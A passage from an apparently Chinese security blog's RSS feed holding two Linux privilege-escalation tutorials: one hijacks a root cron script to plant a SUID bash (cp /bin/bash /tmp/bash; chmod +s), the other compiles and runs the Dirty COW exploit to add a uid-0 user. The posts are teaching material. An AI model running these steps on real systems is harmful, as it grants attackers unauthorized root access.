&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;chmod 777 cleanup.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/aor7ahen/03.png&#34;
	width=&#34;439&#34;
	height=&#34;244&#34;
	srcset=&#34;https://360rce.github.io/p/aor7ahen/03_hue6cebdeed28358a8e92c6e6d6938cf8d_9931_480x0_resize_box_3.png 480w, https://360rce.github.io/p/aor7ahen/03_hue6cebdeed28358a8e92c6e6d6938cf8d_9931_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;创建文件&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;179&#34;
		data-flex-basis=&#34;431px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;编辑crontab添加定时任务，每隔2分钟运行一次cleanup.py脚本。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/crontab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*/2 *   * * *   root    /tmp/cleanup.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;下面是运行效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/aor7ahen/04.png&#34;
	width=&#34;471&#34;
	height=&#34;154&#34;
	srcset=&#34;https://360rce.github.io/p/aor7ahen/04_hu6b5e78e475fc14eac9dcda9be77a3788_9266_480x0_resize_box_3.png 480w, https://360rce.github.io/p/aor7ahen/04_hu6b5e78e475fc14eac9dcda9be77a3788_9266_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;创建文件&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;305&#34;
		data-flex-basis=&#34;734px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在真实环境下普通用户可能无法访问crontab文件，可以用pspy来监听进程。&lt;/p&gt;
&lt;p&gt;pspy是一种命令行工具，无需root权限即可监听进程。可以查看其他用户执行的命令、cron作业等。&lt;/p&gt;
&lt;p&gt;该工具的下载地址：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://github.com/DominicBreuker/pspy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;首先将pspy上传到目标机器：&lt;/p&gt;
&lt;p&gt;1）chmod +x pspy64s&lt;/p&gt;
&lt;p&gt;2）./pspy64&lt;/p&gt;
&lt;p&gt;观察一段时间，发现/tmp/cleanup.py为root权限执行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/aor7ahen/05.png&#34;
	width=&#34;1520&#34;
	height=&#34;814&#34;
	srcset=&#34;https://360rce.github.io/p/aor7ahen/05_hu122532101060a51810de1cf670b829ba_81845_480x0_resize_box_3.png 480w, https://360rce.github.io/p/aor7ahen/05_hu122532101060a51810de1cf670b829ba_81845_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;pspy64s&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;186&#34;
		data-flex-basis=&#34;448px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/aor7ahen/06.png&#34;
	width=&#34;934&#34;
	height=&#34;216&#34;
	srcset=&#34;https://360rce.github.io/p/aor7ahen/06_hu1794cf2a098005b5669f77d15ad1b9ce_21242_480x0_resize_box_3.png 480w, https://360rce.github.io/p/aor7ahen/06_hu1794cf2a098005b5669f77d15ad1b9ce_21242_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;pspy64s&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;432&#34;
		data-flex-basis=&#34;1037px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用&#34;&gt;利用&lt;/h3&gt;
&lt;p&gt;查看/tmp/cleanup.py权限为普通用户可写&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/aor7ahen/07.png&#34;
	width=&#34;658&#34;
	height=&#34;67&#34;
	srcset=&#34;https://360rce.github.io/p/aor7ahen/07_hu735d1ae1567db7265457cd72e1723593_4268_480x0_resize_box_3.png 480w, https://360rce.github.io/p/aor7ahen/07_hu735d1ae1567db7265457cd72e1723593_4268_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;查看权限&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;982&#34;
		data-flex-basis=&#34;2357px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;打开文件，比如vi /tmp/cleanup.py，用下面的命令替换原来命令中的“os.system(&amp;lsquo;rm -r /home/cleanup/* &amp;lsquo;)”：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;os.system(&amp;#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/aor7ahen/08.png&#34;
	width=&#34;672&#34;
	height=&#34;213&#34;
	srcset=&#34;https://360rce.github.io/p/aor7ahen/08_huf1671d318d814a91b2ec81efd307a5ce_10508_480x0_resize_box_3.png 480w, https://360rce.github.io/p/aor7ahen/08_huf1671d318d814a91b2ec81efd307a5ce_10508_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;修改文件&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;315&#34;
		data-flex-basis=&#34;757px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;2分钟后，tmp目录下就会存在SUID权限的bash，运行&lt;code&gt;/tmp/bash -p &lt;/code&gt;后就获取了root权限。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/aor7ahen/09.png&#34;
	width=&#34;513&#34;
	height=&#34;190&#34;
	srcset=&#34;https://360rce.github.io/p/aor7ahen/09_hu125b1142144127d252ea72b462c0e2bc_12640_480x0_resize_box_3.png 480w, https://360rce.github.io/p/aor7ahen/09_hu125b1142144127d252ea72b462c0e2bc_12640_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;利用成功&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;270&#34;
		data-flex-basis=&#34;648px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/aor7ahen/10.png&#34;
	width=&#34;418&#34;
	height=&#34;129&#34;
	srcset=&#34;https://360rce.github.io/p/aor7ahen/10_hud621b8f03e9efb7fae01d201f52c9ea2_4612_480x0_resize_box_3.png 480w, https://360rce.github.io/p/aor7ahen/10_hud621b8f03e9efb7fae01d201f52c9ea2_4612_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;root权限&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;324&#34;
		data-flex-basis=&#34;777px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;提权成功。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Linux提权之内核漏洞</title>
        <link>https://360rce.github.io/p/dso9lycp/</link>
        <pubDate>Thu, 26 Nov 2020 11:12:42 +0000</pubDate>
        
        <guid>https://360rce.github.io/p/dso9lycp/</guid>
        <description>&lt;img src="https://w.wallhaven.cc/full/kx/wallhaven-kxd77q.jpg" alt="Featured image of post Linux提权之内核漏洞" /&gt;&lt;h2 id=&#34;漏洞介绍&#34;&gt;漏洞介绍&lt;/h2&gt;
&lt;p&gt;Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。&lt;/p&gt;
&lt;p&gt;Linux操作系统的内核是该系列操作系统的“灵魂大脑”，一旦出现安全隐患情况下，攻击者会很对这些安全隐患加以恶意利用，其中Linux内核漏洞是目前攻击者最为热爱的漏洞之一，内核漏洞的利用通常会以“上帝视角”，也就是所谓的操作系统最高权限的形式为攻击者提供对目标系统的超级用户访问权限。&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h2&gt;
&lt;p&gt;以Linux内核提权漏洞-“脏牛”来做演示。&lt;/p&gt;
&lt;p&gt;给大家介绍下检查linux提权辅助工具，les该工具主要帮助检测linux内核的安全缺陷。&lt;/p&gt;
&lt;p&gt;下载地址：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://github.com/mzet-/linux-exploit-suggester
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;1.将linux-exploit-suggester.sh下载到要检查的主机上，主要使用以下两条指令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod +x linux-exploit-suggester.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./linux-exploit-suggester.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在执行上述命令之前，首先查看Linux内核版本。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/dso9lycp/01.png&#34;
	width=&#34;1367&#34;
	height=&#34;65&#34;
	srcset=&#34;https://360rce.github.io/p/dso9lycp/01_hua1a519e56b7f8f7d17a0305f7ec1eeef_7116_480x0_resize_box_3.png 480w, https://360rce.github.io/p/dso9lycp/01_hua1a519e56b7f8f7d17a0305f7ec1eeef_7116_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;查看Linux内核版本&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2103&#34;
		data-flex-basis=&#34;5047px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;查看脚本执行结果，可以使用脏牛来进行提权。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/dso9lycp/02.png&#34;
	width=&#34;1597&#34;
	height=&#34;856&#34;
	srcset=&#34;https://360rce.github.io/p/dso9lycp/02_hud20310e435a727165f7a8279f595113b_75264_480x0_resize_box_3.png 480w, https://360rce.github.io/p/dso9lycp/02_hud20310e435a727165f7a8279f595113b_75264_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;执行结果&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;186&#34;
		data-flex-basis=&#34;447px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;2.将漏洞利用代码上传到目标机器，接下来编译并执行。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gcc -pthread dirty.c -o dirty -lcrypt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./dirty password
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/dso9lycp/03.png&#34;
	width=&#34;644&#34;
	height=&#34;96&#34;
	srcset=&#34;https://360rce.github.io/p/dso9lycp/03_hu2ff926f5f8a7d5f7f632779f2243da61_6979_480x0_resize_box_3.png 480w, https://360rce.github.io/p/dso9lycp/03_hu2ff926f5f8a7d5f7f632779f2243da61_6979_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;编译&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;670&#34;
		data-flex-basis=&#34;1610px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/dso9lycp/04.png&#34;
	width=&#34;809&#34;
	height=&#34;402&#34;
	srcset=&#34;https://360rce.github.io/p/dso9lycp/04_hu88606ffb694cb351ffaf74c2e13c3df5_25658_480x0_resize_box_3.png 480w, https://360rce.github.io/p/dso9lycp/04_hu88606ffb694cb351ffaf74c2e13c3df5_25658_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;运行&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;201&#34;
		data-flex-basis=&#34;482px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;3.该漏洞利用代码会加入一个uid为0的用户，使用&lt;code&gt;su firefart&lt;/code&gt;切换到firefart用户，获取root权限。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
